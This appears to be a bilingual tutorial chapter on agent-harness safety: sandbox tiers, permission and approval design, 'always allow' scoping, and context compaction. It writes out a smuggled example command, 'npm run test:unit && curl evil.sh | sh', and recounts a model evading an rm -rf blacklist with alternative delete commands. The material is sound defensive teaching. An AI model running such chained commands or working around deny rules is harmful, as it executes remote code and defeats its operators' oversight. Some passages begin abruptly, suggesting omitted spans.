代价也要知道。覆盖面有限：这套模式词汇只管文件效果，网络和进程可见性根本没管——dsh 的 README 把这条明写出来，"不去假装覆盖后端没覆盖的东西"，这比含糊地宣称"已沙箱化"诚实得多。强度会打折：老内核上 Landlock 只能做到 partial，Windows 那条 ACL 路径因为 Everyone 与硬链接的边界也只报 partial，它们照实上报而不是假装 full。会误伤：构建工具要写缓存和临时目录，所以 workspace-write 除了工作区还得放开真实的临时目录（macOS 上 /tmp 其实是 /private/tmp，路径必须先规范化再进规则，否则规则永远匹配不上）。会不可用：机制缺失或探测失败时，唯一正确的行为是抛 SANDBOX_UNAVAILABLE 失败关死，绝不"这次就先不围了"。

Know the costs too. Limited coverage: this mode vocabulary governs file effects only — network and process visibility are not restricted at all, and dsh's README says so outright rather than pretending to cover what the backend does not, which is far more honest than a vague "sandboxed" claim. Degraded strength: on older kernels Landlock reaches only partial, and the Windows ACL rung reports partial because of the Everyone and hard-link boundaries — both report it instead of claiming full. Collateral damage: build tools write to caches and temp dirs, so workspace-write must open the real temp directory as well as the workspace (on macOS /tmp IS /private/tmp; canonicalize paths before they enter a profile or the rule never matches). Unavailability: when the mechanism is missing or a probe fails, the only correct behavior is to throw SANDBOX_UNAVAILABLE and fail closed — never "just this once, unconfined."

本地与云上LOCAL AND CLOUD

"沙箱"这个词底下其实盖着两个完全不同的决定：在同一台机器上围一个圈，还是换一个世界。dsh 把这条界线画得很清楚——bwrap、Landlock、Seatbelt 是这条接缝的后端，而容器、微虚拟机、远程执行器不是：它们替换的是整组能力提供者（shell、文件系统一起搬过去）。这不是术语洁癖，是两种截然不同的工程后果。

Two very different decisions hide under the one word "sandbox": drawing a fence on the same machine, or moving to another world. dsh draws that line explicitly — bwrap, Landlock, and Seatbelt are backends of this seam, while containers, microVMs, and remote executors are not: they replace whole groups of capability providers (shell and filesystem move together). That is not terminological fussiness but two different engineering outcomes.

第一档，内核围栏。不需要"创建"任何东西——Landlock、Seatbelt、Windows 的受限令牌都是操作系统本来就带的能力，你的进程在 spawn 前多包一层 argv 就有了，开销接近零，没有启动时间。它围的是你这台机器上的这一棵进程树；文件还是你的文件，agent 改的就是你正在编辑的工作区。优点是零成本、零延迟、结果立刻落在你的仓库里；风险面也正是这一点：围栏一旦配错，错就发生在你的真实文件上。这一档里"拒绝"是个可分类、可升级的事件——被拦下 → 问人 → 放宽这一次重试，就是 L5 代码里跑通的那条路。

Tier one, the kernel fence. Nothing has to be "created." Landlock, Seatbelt, and Windows restricted tokens are capabilities the OS already ships; your process gets them by wrapping one more layer of argv before spawning. Near-zero overhead, no startup time. It fences one process tree on your machine, and the files are still your files — what the agent edits is the workspace you are editing. The upside is zero cost, zero latency, results landing directly in your repository; the exposure is the same fact: misconfigure the fence and the mistake happens to real files. In this tier a denial is a classifiable, escalatable event — blocked, ask, widen once, retry — the path the L5 code actually runs.

第二档，容器。要创建：拉镜像、起容器（秒级），你的代码通过挂载或复制进去。它和你共用同一个内核，所以它是极好的环境边界（依赖、版本、路径干净），但业界一般不把它当作对抗恶意代码的安全边界。devcontainer 就是这一档的日常形态。值得注意的是 OpenAI 对 Codex 的建议正是这个组合：如果你要用 danger-full-access，那就在 Docker 里用——把关掉的那道围栏在外面补回来。

Tier two, containers. These must be created: pull an image, start a container (seconds), and your code arrives by mount or copy. They share your kernel, so they are an excellent environment boundary (clean dependencies, versions, paths) but are generally not treated as a security boundary against hostile code. A devcontainer is this tier's everyday form. Notably, OpenAI's own advice for Codex is exactly this combination: if you want danger-full-access, run it inside Docker — restore on the outside the fence you switched off on the inside.

第三档，虚拟机与微虚拟机。"把 agent 放进虚拟机"说的就是这一档：agent 进程跑在一个有自己内核的机器里，你本机的文件它默认根本看不见，要么把仓库 clone 进去，要么显式挂一个共享目录。传统 VM 起来要几十秒，所以专门做了微虚拟机：Firecracker（AWS Lambda 用的那套）、Kata，以及用户态内核 gVisor。E2B 这类给 agent 用的沙箱服务就建在 Firecracker 上，一个沙箱冷启动在 200 毫秒以内，快照恢复只要 5–30 毫秒——正是这个数量级，才让"每个任务一台一次性机器"从奢侈变成默认。dsh 的 packages/e2b 是这条路的验证：文件系统和子进程的提供者整组换到远端，工具层一行不改。

Tier three, VMs and microVMs. "Putting the agent in a VM" means this tier: the agent process runs on a machine with its own kernel, and your local files are invisible to it by default — either clone the repository in or explicitly mount a shared directory. Traditional VMs take tens of seconds to boot, hence microVMs: Firecracker (what AWS Lambda runs on), Kata, and the userspace kernel gVisor. Agent sandbox services like E2B are built on Firecracker, with cold start under 200ms and snapshot restore in 5–30ms — that order of magnitude is what turns "a disposable machine per task" from a luxury into a default. dsh's packages/e2b proves the path: the filesystem and subprocess providers move to the remote as a group while the tool layer changes not one line.

第四档，云上的执行环境。这是第三档加一套仓库工作流：向服务申请一台机器，把仓库 clone 进去，agent 在那边跑，结果以分支、diff 或 PR 的形式回来。云端跑的 coding agent（网页版、云任务、Codespaces 那类环境）都是这个形状。注意这时候"沙箱"已经不是围栏，而是一个世界：在那台机器上 agent 基本就是 root，也没有"升级重试"这回事——它本来就什么都能做。安全性不再来自限制它的动作，而来自那台机器是一次性的、跟你的硬盘没有共享文件系统。

Tier four, cloud execution environments. Tier three plus a repository workflow: request a machine from a service, clone the repository into it, let the agent work there, and get results back as a branch, a diff, or a pull request. Cloud-run coding agents — web sessions, cloud tasks, Codespaces-style environments — all have this shape. Here "sandbox" is no longer a fence but a world: on that machine the agent is effectively root and there is no "escalate and retry" — it could already do everything. Safety no longer comes from restricting its actions but from the machine being disposable and sharing no filesystem with your disk.

所以有一条必须说清楚："跑在云上"不等于安全。隔离的是你的笔记本，不是你的账号。那台机器上通常有你的 git 凭据、包管理器 token、有时还有 API key——它防得住"删了我的硬盘"，防不住"把私有代码推到公开仓库"或者"用你的 token 发请求"。后者要靠别的东西：网络出站策略、最小权限的一次性凭据、以及 PR 这道人工复核。这也是为什么云上环境常常同时关掉审批（因为没人在旁边）又限制网络（因为没人在旁边）。

So one thing must be said plainly: "it runs in the cloud" does not mean safe. What is isolated is your laptop, not your account. That machine usually holds your git credentials, package tokens, sometimes API keys — it protects against "wiped my disk," not against "pushed private code to a public repo" or "spent your token." Those need other controls: egress network policy, least-privilege disposable credentials, and the human review that a pull request forces. It is also why cloud environments so often disable approval (nobody is there) and restrict the network (nobody is there) at the same time.

权限怎么做HOW PERMISSION IS DONE

先看业界的谱系，从弱到强：不做（玩具阶段，也是大多数教程的样子）；按工具名开关（这个工具允许、那个禁止，Claude Code 的 allowedTools 是这一档的成熟形态，还支持 Bash(git diff:*) 这种带参数前缀的模式）；按参数判（路径前缀、命令前缀、正则）；按效果分类（把动作归成读 / 写 / 网络 / 执行几类能力，规则写在类上而不是工具名上）；交给内核（沙箱）。真实系统一般同时用最后三档：能分类的按效果分类，分不了的问人，兜底交给内核。

The industry spectrum, weakest first: nothing (the toy stage, and most tutorials); per-tool switches (this tool allowed, that one not — Claude Code's allowedTools is the mature form, with argument-prefix patterns like Bash(git diff:*)); per-argument rules (path prefixes, command prefixes, regexes); per-effect classification (sort actions into read / write / network / execute capabilities and write rules against the class rather than the tool name); and hand it to the kernel (the sandbox). Real systems use the last three together: classify what can be classified, ask about the rest, and let the kernel backstop everything.

要怎么做，三条硬规矩。第一，判定是纯函数，返回三态加理由。(工具名, 参数, 会话上下文) → allow | ask | deny，没有副作用，不发起 IO，不写日志——因为它要能被单测、能被原样展示给人看（审批框里那句"为什么问我"就是它的 reason）、能在同样输入下永远给同样答案。返回 deny 时必须带一句人话理由：模型会把它读给用户听，而用户要靠它判断是不是该改配置。

How to do it, three hard rules. First, the decision is a pure function returning three states plus a reason. (tool name, args, session context) → allow | ask | deny, with no side effects, no IO, no logging — because it must be unit-testable, displayable verbatim to a human (the "why am I being asked" line in the prompt is its reason), and deterministic for the same input. A deny must carry a human sentence: the model reads it back to the user, and the user decides from it whether the configuration needs changing.

第二，在真正产生效果的那个操作里强制。dsh 的包规约里有一条写得非常准，值得抄进你自己的项目："在做出决定的那个操作里执行它。当直接调用者或另一条调用路径可以绕开时，schema 里不写、prompt 里过滤、外面包一层门面、靠监听器顺序，都不算强制；拒绝必须从执行器那一端测。"你在 tool schema 里不暴露 rm 参数，不是强制；你在 system prompt 里写"禁止删除"，不是强制；你在 UI 上把按钮灰掉，更不是强制。唯一算数的地方，是那个真的会发生副作用的函数内部。

Second, enforce the decision in the operation that makes it. dsh's package rules put this precisely enough to steal verbatim: "Enforce a decision in the operation that makes it. Schema omission, prompt filtering, facades, wrappers, and listener order are not enforcement when direct or alternate callers can bypass them; test denial through the executor." Not exposing an rm parameter in a tool schema is not enforcement. Writing "never delete" in a system prompt is not enforcement. Greying out a button is certainly not. The only place that counts is inside the function where the effect actually happens.

第三，默认值不是 allow。没有规则命中时，有人在就 ask，没人在就 deny。反过来（默认放行、靠黑名单挡）在这一课的实测里已经被打穿了：黑名单只认得 rm -rf，模型两步之内就交出了 find -delete、rm、rmdir 三种写法，还热心建议"先清空目录再删"。白名单可以慢慢长，黑名单永远追不上一个会写代码的对手。

Third, the default is not allow. When no rule matches: ask if a human is present, deny if not. The inverse — allow by default, block by blacklist — was already broken in this lesson's own transcript: the blacklist knew only rm -rf, and within two steps the model produced find -delete, rm, and rmdir, then helpfully proposed "empty the directory first." An allowlist can grow slowly; a denylist never catches up with an adversary who can write code.

Answer: do not ask about what you can decide (read-only actions just allow), show the exact command and its blast radius when you do, and offer a safer option (for instance, "rerun read-only"). Concurrent prompts. A batch of tool calls runs in parallel; three dialogs at once and the human has no idea which one they are approving. Answer: approvals must be serialized — this lesson's code replaces L2's Promise.all with a sequential loop for exactly that reason. Nobody to ask. CI, headless runs, and automation protocols have no human at all. Answer: fail closed — no answerer means refused, never "nobody objected, so proceed." 授权范围。人点的那个"是"，到底覆盖什么？这一次这条命令？这个工具？这个目录？范围越大越难说清、越难撤销。对策：默认只覆盖这一次这个动作；想做"以后都允许"，先回答它存在哪、谁能撤销、fork 出去的会话继不继承（这正是练习二）。批的和跑的不是同一条。人看到 ls /tmp 点了同意，如果你在批准之后又重新拼了一次命令行，实际执行的可能是别的东西。对策：批准之后原样把那串 argv 交给执行/沙箱，中间任何一层都不许改写。审计。谁在什么时候批了什么，必须留下来——但这些记录属于人和运维，不属于模型上下文。对策：asked 与 decided 成对写进日志（用 L4 的话说就是两个事件），模型只看得到最终那条工具结果；把审批 UI 的文本塞进上下文，既浪费 token 又教会模型去揣摩审批器。人不在终端前。Web、手机、远程会话里，弹窗得能跨进程送出去再送回来。对策：把审批做成一条接缝而不是一个 readline 调用——请求是数据，谁来回答是可替换的实现。

Scope of the grant. What does that "yes" cover — this command, this tool, this directory? The wider it goes, the harder it is to state and to revoke. Answer: cover this one action by default; before building "always allow," answer where it lives, who revokes it, and whether a forked session inherits it (that is exercise two). Approved ≠ executed. Someone approves ls /tmp; if you re-assemble the command line after approval, something else may run. Answer: pass the approved argv through to execution and the sandbox untouched, with no layer allowed to rewrite it. Audit. Who approved what, and when, must be recorded — but that record belongs to humans and operators, not to the model's context. Answer: log asked and decided as a pair (in L4's terms, two events) and let the model see only the eventual tool result; feeding approval UI text into context wastes tokens and teaches the model to game the approver. The human is not at the terminal. On web, on a phone, in a remote session, the prompt must travel across processes and back. Answer: make approval a seam, not a readline call — the request is data, and who answers it is a replaceable implementation.

三件事值得记住。第一，"自动跑"这一档能存在，全靠沙箱。它的交易是用围栏换审批：工作区里随便跑不问你，因为跑不出工作区；一旦要出界或要联网，才回来问。没有沙箱的"自动跑"不是 auto，那就是 YOLO——两者在界面上长得一模一样，区别只在有没有那道内核围栏。

Three things worth keeping. First, the "auto run" tier exists only because of the sandbox. Its bargain is fence traded for prompts: it runs freely inside the workspace without asking because it cannot leave the workspace, and it comes back to ask only when it needs to step outside or reach the network. "Auto run" without a sandbox is not auto, it is YOLO — the two look identical in the UI, and differ only by whether that kernel fence exists.

第二，"不问"有两个意思，方向正好相反。一种是把"需要问的"变成拒绝（Claude Code 的 dontAsk：预授权之外全部失败）——这是更严的无人值守模式，headless 和 CI 该用这个。另一种是把"需要问的"变成同意（never / bypassPermissions）——这是更松。两者在命令行上都叫"不要问我"，后果天差地别；选错方向就是把无人值守跑成了无人看管。

Second, "do not ask" means two opposite things. One turns anything that would prompt into a denial (Claude Code's dontAsk: everything outside the pre-approved surface fails) — the stricter unattended mode, and the right one for headless runs and CI. The other turns the same prompts into consent (never, bypassPermissions) — looser. Both read as "stop asking me" on the command line, with opposite consequences; picking the wrong direction turns unattended into unsupervised.

第三，deny 是压不倒的。Claude Code 的判定顺序是先查 deny 再查 allow，即使在 bypassPermissions 档，deny 规则依然拦得住。这跟我们在 L5 里把 .env 从沙箱的"模式表"里单独拿出来封死是同一个设计："跳过权限"跳过的应该是"问"，而不是"禁"。你写自己的 harness 时，这条要在一开始就分清楚——把 deny 和 ask 混成一个开关，后面就再也拆不开了。

Third, deny is not overridable. Claude Code evaluates deny rules before allow rules, and a deny still blocks even under bypassPermissions. That is the same design as sealing .env outside the sandbox's mode table in L5: "skip permissions" should skip the asking, never the forbidding. Separate the two on day one of your own harness — fuse deny and ask into a single switch and you will never pull them apart again.

"以后别再问我""DON'T ASK AGAIN"

最常用的那个功能：弹框里点"总是允许"，下次就不问了。它看着只是省事，其实是把一次性授权变成了一条持久规则——一旦要做，四个问题必须当场答清楚。

The feature everyone uses: click "always allow" and it stops asking. It looks like a convenience, but it converts a one-shot grant into a durable rule — and the moment you build it, four questions need answers.

①记什么（粒度）。常见四种：整个工具（"以后 Read 都不用问"）、命令前缀（Bash(npm run test:*)——最常用也最危险的一种）、路径模式（Edit(src/**) 允许，Read(./.env) 拒绝）、以及某个 MCP 服务器的某个操作。粒度选错，要么天天还在弹框，要么一次点开了一扇再也关不上的门。

① What gets remembered (granularity). Four common forms: a whole tool ("never ask about Read again"), a command prefix (Bash(npm run test:*) — the most used and most dangerous), path patterns (allow Edit(src/**), deny Read(./.env)), and a specific operation on a specific MCP server. Pick the wrong granularity and you either keep clicking prompts forever or open a door you cannot close.

②记在哪（作用域）。Claude Code 把它分得很清楚：点"以后别问"存进 .claude/settings.local.json——你个人的、这个项目的，不进仓库；而写进 .claude/settings.json 的规则是团队共享的，会随 git 分发，所以它需要多一步"信任这个工作区"。这个区分不是洁癖：一个能进 git 的允许列表，等于任何能改仓库的人都能替你的 agent 发权限；克隆一个陌生仓库就自动获得一串 allow 规则，那是供应链问题，不是配置问题。

② Where it is remembered (scope). Claude Code separates these carefully: "don't ask again" writes to .claude/settings.local.json — yours, for this project, not committed — while rules in .claude/settings.json are shared with the team, travel through git, and therefore require an extra "trust this workspace" step. That split is not fussiness: an allowlist that can enter git means anyone who can edit the repository can grant permissions to your agent. Cloning an unfamiliar repository and inheriting its allow rules is a supply-chain problem, not a configuration one.

③规则匹配在什么上（表达力陷阱）。这是最容易出事的一条。你允许了 npm run test:*，那 npm run test:unit && curl evil.sh | sh 算不算命中？如果你的匹配是对整条命令字符串做前缀判断，那就命中了——一条"允许"等于允许任意命令。正确做法是先把命令解析成结构（拆开 &&、;、管道、命令替换、重定向），每一段分别过规则，任何一段不过就整条拒绝；解析不了的（有 $( )、有变量、有 eval）一律回到问人。写自己的 harness 时，这一步是"允许前缀"这个功能的全部难度所在。

③ What the rule matches against (the expressiveness trap). This is where it breaks. You allowed npm run test:* — does npm run test:unit && curl evil.sh | sh match? If your matching is a prefix test on the whole command string, it does, and one "allow" becomes allow-anything. The correct approach is to parse the command into structure first (split on &&, ;, pipes, command substitution, redirection), run every segment against the rules, and refuse the whole line if any segment fails; anything unparseable ($( ), variables, eval) goes back to asking a human. In your own harness, that step is the entire difficulty of the "allow a prefix" feature.

④谁能撤销、谁会继承。规则会悄悄长大——半年后 settings.local.json 里那三十条你已经不记得为什么加了。所以要有一个能看见它们的地方（/permissions 那种命令）和一个删掉的动作；还要想清楚从这个会话 fork 出去的新会话继不继承。这四个问题正是 dsh 至今只提供 allowed-once、不做"永远允许"的原因——它的 README 把这条限制明写在"已知限制"里，而不是假装没有。不是所有的"没做"都是没做完；有些是想清楚了才不做。

④ Who revokes it, and who inherits it. Rules grow quietly — six months on, the thirty entries in settings.local.json have reasons nobody remembers. So you need a place to see them (a /permissions-style command) and an action to delete them, plus a decision about whether a session forked from this one inherits them. Those four questions are exactly why dsh still offers only allowed-once and no "always" — its README states the limitation under Known Limitations instead of pretending otherwise. Not everything missing is unfinished; some of it is declined on purpose.

实践上三条够用了：只给幂等的东西 always（git status、npm run test、只读工具），永远不要 always 一整个 Bash（那等于关掉这道防线还留着一个"我已经审批过了"的假象），把 deny 写在 always 之前——凭据、密钥、.git/config、CI 配置这些，任何档位都不该能读或写。

Three practices cover it: only "always" idempotent things (git status, npm run test, read-only tools); never "always" the whole Bash tool (that switches the line off while keeping the illusion that you approved something); and write your deny rules before any always — credentials, keys, .git/config, and CI configuration should be unreadable or unwritable in every mode.

policy 管道THE POLICY PIPELINE

现在回答那个词。"策略挂在管线上"说的是：权限、审批、沙箱这三样，一行都不写在工具实现里面，而是挂在 L2 那条固定管线的三个阶段上——执行前（判定、审批、外部 hook）、执行中（沙箱包裹、超时、计量）、执行后（结果重写、超长溢出、UI 呈现与日志）。read_file 不知道有权限这回事，权限也不知道 read_file 是怎么读文件的。这样做的收益有三个：加一条策略不用碰任何工具；加一个工具自动被所有策略覆盖；而且因为只有一条路，你能证明没有旁路——想绕过策略，只能绕过整条管线。

Now the phrase itself. "Policy hangs on the pipeline" means that permission, approval, and sandboxing live nowhere inside a tool implementation. They attach to the three stages of L2's fixed path: before execution (decision, approval, external hooks), during (sandbox wrapping, timeout, metering), and after (result rewriting, oversize spill, UI rendering and logging). read_file does not know permission exists, and permission does not know how read_file reads a file. Three payoffs: a new policy touches no tool; a new tool is covered by every policy for free; and because there is exactly one path, you can prove there is no bypass — to route around the policy you would have to route around the pipeline.

所以那句"绕过管线"不是修辞。你的代码里如果有任何一处直接 await readFile(path) 而不是走 execute(call)，那一处就是旁路，等于那条权限从没写过。dsh 的测试规约干脆把它写成硬要求：拒绝要从执行器那一端测——不是测规则函数返回了 deny，而是测那个真的会动文件的东西确实没动。

So "routing around the pipeline" is not a figure of speech. Any place in your code that calls await readFile(path) directly instead of going through execute(call) is a bypass, and the rule might as well not exist. dsh's testing rules make this a hard requirement: test denial through the executor — not that the rule function returned deny, but that the thing which actually touches files did not touch them.

管的只是工具吗IS IT ONLY TOOLS?

主要是，但不止。工具调用是模型唯一能主动做事的通道，所以它是权限的第一现场；但凡是能产生副作用的入口都必须过同一条管线，否则就是旁路：子 agent 的派发（它自己也会调工具，用谁的权限？）、MCP 或远程服务调用、hook 执行的外部命令、skill 里自带的脚本、workflow 的 worker 线程。dsh 把这些各自做成接缝，但共用同一套沙箱模式与工作区根，就是为了不让其中任何一个变成后门。

Mostly, but not only. A tool call is the model's sole channel for making anything happen, so it is where permission lives first — but every entry point that can produce an effect must go through the same pipeline or it is a bypass: subagent dispatch (it calls tools too — under whose permissions?), MCP and remote service calls, commands run by hooks, scripts bundled inside skills, workflow worker threads. dsh makes each of these its own seam while sharing one sandbox mode and workspace root, precisely so that none of them becomes a back door.

反过来，有一样东西不需要权限：模型自己写出来的文字。它没有效果。这正是 L1 那句结论的另一面——tool call 只是意图，执行永远发生在你的代码里；所以权限系统的位置也永远只有一个：在你的代码里，在那个真的会动世界的函数前面。

Conversely, one thing needs no permission at all: the text the model writes. It has no effect. That is the other face of L1's conclusion — a tool call is only an intent; execution always happens in your code — which is why a permission system has exactly one possible home: in your code, immediately in front of the function that actually moves the world.

// ① 判定：纯函数，无副作用，所以可测、可复述
function policy(name, args) {
  if (name === 'read_file' && SECRET.test(args.path)) return { decision: 'deny', reason: '这是凭据文件' }
  if (name === 'bash') {
    for (const [pattern, why] of FORBIDDEN) if (pattern.test(args.command)) return { decision: 'deny', reason: why }
    return { decision: 'ask', reason: '要在 shell 里执行命令' }   // 用正则判 shell 命令注定漏，所以默认问
  }
  return { decision: 'allow', reason: '只读，且在工作区内' }
}

// ② 审批：一次一授；没人能回答就拒绝
async function approve(question) {
  audit.push({ type: 'approval/asked', question })          // 进日志，模型看不见
  const granted = policy === 'never' ? false
    : !process.stdin.isTTY ? false                          // fail closed：没有人 ≠ 同意
    : (await rl.question(`⚠ ${question} [y/N] `)).trim().toLowerCase() === 'y'
  audit.push({ type: 'approval/decided', granted })
  return granted
}

// ③ 围栏：把即将 spawn 的 argv 原样包一层，不重新拼字符串
function runConfined(command, signal, mode = 'read-only') {
  const argv = ['-p', PROFILES[mode], 'bash', '-c', command]
  return new Promise((done) => execFile('sandbox-exec', argv, { signal }, (error, stdout, stderr) => {
    const output = (stdout + stderr).trim()
    if (!error) return done({ ok: true, mode, output })
    // 拒绝是一条结果，还带着"我在哪种模式下跑"这个事实
    done({ ok: false, mode, denied: DENIAL.test(output), output })
  }))
}

// 升级重试：沙箱说不行 → 问人 → 只把这一次调用放宽，会话默认值不动
let result = await run(args, signal, 'read-only')
if (!result.ok && result.denied && await approve('允许放宽到 workspace-write 再试一次吗？')) {
  result = await run(args, signal, 'workspace-write')
}

凭据那一条要写两遍，一遍在判定里（给人一个看得懂的理由），一遍在围栏里（真的拦住）。围栏里的写法是把 .env 直接从模式这张表里拿出来：两种模式都读不到，升级也打不开——有些禁令不该是可以被批准的。

对照SPECIMEN

dsh 把这三样各自做成了独立的接缝。dsh-user-approval 是一条 waterfall：ctx.approval.request() 只返回四种结果——allowed-once、rejected、cancelled、unavailable；没有配置回答者就是 unavailable，然后失败关死；每个请求必须属于一个打开的 turn；approval/asked 与 approval/decided 成对写进日志，而模型只看得到最终那条工具结果——人机审批的界面不是上下文。dsh-bash-sandbox 只做拒绝、从不谈判：它把执行器要 spawn 的 argv 交给沙箱提供者，拒绝作为 result.sandbox.denied 报上来，同时带上 mode 和 enforcement（老内核上只能做到 partial，它照实说）；沙箱不可用时抛 SANDBOX_UNAVAILABLE，绝不静默地跑一次没有围栏的命令。dsh-permission-presets 再把"沙箱模式 + 审批策略"打包成一个用户能选的名字（workspace-write / danger-full-access），选择本身是一个只进日志的事件，并且在会话创建时把这几个值钉死在这个会话里——之后你改全局设置，已经在跑的会话一个字节都不受影响。

dsh builds each of the three as its own seam. dsh-user-approval is a waterfall: ctx.approval.request() returns exactly four outcomes — allowed-once, rejected, cancelled, unavailable — an unconfigured answerer yields unavailable and fails closed; every request must belong to an open turn; approval/asked and approval/decided are logged as a pair while the model sees only the resulting tool outcome, because the human permission UI is not context. dsh-bash-sandbox denies and never negotiates: it hands the provider the exact argv the executor was going to spawn, reports a block as result.sandbox.denied alongside the mode and the enforcement it achieved (on an older kernel it says partial rather than pretending), and throws SANDBOX_UNAVAILABLE rather than silently running one unconfined command. dsh-permission-presets then bundles sandbox mode plus approval policy into a name a user can pick (workspace-write / danger-full-access), records the choice as a log-only event, and pins those values into the session at creation — change your global setting later and a running session does not shift by a byte.

最值得注意的是它没有的东西：到今天为止，dsh 只有 allowed-once，没有"永远允许"、没有规则表、没有撤销入口，会话级策略只有 ask / never 两档。这不是没做完，这是想清楚了才不做——一条"以后都允许"是持久状态：它得能被日志记下来、被撤销、被 fork 出去的会话继承或不继承，还得在换了目录、换了参数之后仍然说得清自己到底覆盖了什么。想不清楚这些之前，一次一授是唯一诚实的语义。你写自己的 harness 时会第一时间想加这个功能——先去回答那几个问题。

The most instructive part is what it lacks: to this day dsh has only allowed-once — no allow-always, no rule store, no revocation, and a session policy of just ask or never. That is not unfinished work but a decision. "Always allow" is durable state: it has to be logged, revoked, inherited (or not) by forked sessions, and still able to say exactly what it covers after the directory or the arguments change. Until those answers exist, one-shot is the only honest semantics. You will want this feature within an hour of writing your own harness — answer those questions first.

概念CONCEPT

三件事，顺序不能乱：先测量（响应里的 usage 是实测值，别猜），再少放进来（溢出、检索代替通读、分片让子 agent 去读），最后才压缩。为什么压缩排最后？因为它是唯一一个有损且有代价的手段：要额外花一次模型调用，会丢掉细节，还会打掉前缀缓存。

Three things, and the order matters: first measure (usage in the response is ground truth — do not guess), then let less in (spill, search instead of full reads, shard the reading into subagents), and only then compact. Why last? Because it is the one technique that is lossy and costly: an extra model call, lost detail, and a destroyed prefix cache.

一句可以带走的原则：能不进历史的，就别进历史。已经进去的东西，你只能用越来越贵的手段处理它。

One principle to take away: whatever can stay out of the history should stay out. Once something is in, every remedy costs more than keeping it out would have.

计量METERING

估算仍然需要——你得在发请求之前决定要不要压缩。这一课用的是最土的办法：字符数 / 2.5，中英代码混排时够用；估算用于决策，实测用于记账，两者不要混。

You still need an estimate, because the compaction decision happens before the request. This lesson uses the crudest one — characters / 2.5 — which is close enough for mixed CJK, English, and code. Estimates drive decisions, measurements drive accounting; do not confuse the two.

然后是这一课最反直觉的一条：前缀缓存。服务端会缓存"历史开头那一段"的计算结果，只要这次请求的前缀和上次一模一样就能复用，价格低一大截。所以只追加、不改写的历史，天然对缓存友好——上一节那次只溢出不压缩的运行，缓存命中率是 80%。反过来，任何"重写历史开头"的动作都会把缓存清零。最常见的错误就是把动态信息塞进 system prompt：每步都变的时间戳、剩余预算、当前模式，看着无害，代价是每一步的前缀都不同、缓存永远命中不了。正确做法是把它作为一条消息追加在历史末尾，而且只在真正变化时追加一次——这一课的 context/notice 就是这么做的，dsh 也是这么做的（它的 README 里管这叫 append-only after retained history）。

Then the counter-intuitive part: the prefix cache. The server caches the computation for the leading span of the history and reuses it whenever the next request starts with exactly the same prefix, at a large discount. So an append-only history is naturally cache-friendly — the spill-only run above hit 80%. Conversely, anything that rewrites the beginning zeroes the cache. The most common mistake is putting dynamic information in the system prompt: a timestamp, the remaining budget, the current mode. It looks harmless, and it makes every step's prefix different so the cache never hits. The fix is to append it as a message at the end, and only when it actually changes — which is what this lesson's context/notice does, and what dsh does (its README calls it append-only after retained history).

压缩COMPACTION

溢出压不住的时候才轮到它：把中间那一段历史交给模型总结成一段话，用摘要顶替原文。三条规矩，每一条都是踩过才知道的：

Only when spilling is not enough: hand a middle span of the history to the model, get a summary, and let it replace the original. Three rules, each learned the hard way:

① 头尾必须留。开头的 system prompt 和最初那条任务永远不折叠——折掉任务，agent 就忘了自己在干嘛；尾部保留最近几个 step，否则它会忘掉刚刚做到哪。

① Keep the head and the tail. The system prompt and the original task are never folded — fold the task and the agent forgets what it is doing; keep the last few steps or it forgets where it just got to.

② 边界必须落在 step 之间。一个 assistant(tool_calls) 和它的 tool 结果是一对，拆开就是 L4 那个 API 报错。所以折叠的单位是"整个 step"，不是"若干条消息"。

② The boundary falls between steps. An assistant(tool_calls) and its tool results are a pair, and splitting them reproduces L4's API error. So the unit of folding is a whole step, never "some messages."

③ 边界只能右移。第一次写这段时我用"最近 N 条 assistant 消息"去算边界，第二次压缩时它算出了一个比上次更靠左的位置，于是已经折叠过的事件又被放回历史——压缩之后历史从 6163 涨到了 11345 token。修法一行：Math.max(上次边界, 这次算出来的)。

③ The boundary only moves right. My first version computed it from "the last N assistant messages," and the second compaction produced a position further left than the first, putting already-folded events back into the history — compaction grew it from 6,163 to 11,345 tokens. The fix is one line: Math.max(previous boundary, the new one).

还有一条同源的坑："折叠了什么"和"总结了什么"必须来自同一个数。我第一版用消息条数算 keep、用事件 seq 算边界，两者对不上，结果压缩过后 agent 直接迷路——日志里能看到它压完立刻重新 list_dir "."，从头找路，白烧两步。改成"先定边界，再由边界推出折叠区和保留区"就好了。

A sibling trap: "what was folded" and "what was summarized" must come from one number. My first version computed the kept tail by message count and the boundary by event seq; they disagreed, and after compaction the agent was simply lost — the log shows it immediately re-running list_dir "." to find its bearings, burning two steps. Deriving both the folded and the kept range from one boundary fixed it.

最后，压缩不改日志：它产生一条新的 context/compacted 事件（记录边界和摘要），旧事件一个字节都没动。所以你随时能重放到压缩之前，也能从压缩前的任意一步分叉——L4 那条"只追加"的规矩在这里第一次显出真正的价值。

Finally, compaction does not edit the log: it appends one context/compacted event carrying the boundary and the summary, and touches nothing else. So you can always replay to before the compaction, or fork from any step preceding it — the first moment L4's append-only rule really pays.

                              { role: 'user', content: transcript(folded) }], [])).choices[0].message.content
  await append('context/compacted', { through: boundary, summary, foldedMessages: folded.length })
  return summary
}

还有一处值得看：--stats 打印"压缩后有多大"时，这个数字没有存在事件里——它是把日志投影一遍算出来的。凡是能从日志算出来的，就不要再存一份，否则你迟早会有两个不一致的真相。

One more detail: when --stats prints the size after each compaction, that number is not stored in the event — it is computed by projecting the log. Anything derivable from the log should not be stored twice, or you eventually own two disagreeing truths.

对照SPECIMEN

dsh 把这三件事拆成了三个独立的东西。计量是 ctx.tokenMeter：一个"重放感知"的服务，它从持久日志推进自己的账，所以压缩插件和其他对压力敏感的插件共享同一份计量，而不必依赖压缩引擎——和你刚才那个"从日志算账单"的做法是同一个思路。压缩是一条接缝：ctx.compaction 只定义"什么时候算太大、把哪一段总结成一个节点"（WHAT），具体怎么总结由 provider 决定（HOW），还有一个人用的 /compact 命令能手动触发一次。裁剪是单独的 ctx.toolResultPruner：无模型、可重放，把超预算的工具结果重写成"头部 + 省略标记 + 尾部"，而完整的原始事件保留在只追加的日志里。

dsh splits the three into three independent things. Metering is ctx.tokenMeter: a replay-aware service that advances its own fold from the durable log, so compaction and other pressure-sensitive plugins share one accounting without depending on the compaction engine — the same idea as computing your bill from the log. Compaction is a seam: ctx.compaction defines only WHAT (when history is too large, and summarizing an older range into one node) while a provider decides HOW, plus a human-facing /compact command for a manual pass. Pruning is a separate ctx.toolResultPruner: model-free and replay-safe, rewriting over-budget tool results into a bounded head, an omission marker, and a bounded tail, while the full original event stays in the append-only log.

